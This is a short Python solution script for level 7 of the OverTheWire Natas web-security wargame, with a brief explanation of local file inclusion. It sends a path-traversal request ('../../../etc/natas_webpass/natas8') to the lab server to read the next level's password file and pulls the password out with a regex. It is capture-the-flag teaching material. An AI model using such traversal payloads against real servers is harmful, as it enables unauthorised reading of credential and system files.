'''
In web exploitation there are many ways that you can attack a web app.
One exploitation is called LFI (= local file inclusion), and let the user read files from the server that he didn't have access before.
'''
import requests
import re

username = "natas7"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

# I know that I can read files through the "index.php" file and the variable "page".
# I know where I can find the password for the next level so I am creating the path for that file.
# This information came from the official site: http://overthewire.org/wargames/natas/
# You can use "../" to go back a folder and I am abusing that because you can go back to a certain point (/).
lfi="index.php?page=../../../../../../../../../../../etc/natas_webpass/natas8"

response = session.get(url+lfi,auth=(username,password)) # GET request to the "natas8" file inside the "/natas_webpass" folder.
print(response.text)
print("="*50)

# Just Code Printing
exp = re.compile(r"[A-Za-z0-9]{32}")
code = re.findall(exp, response.text)[1]
print("The password for the next level is: " + code)
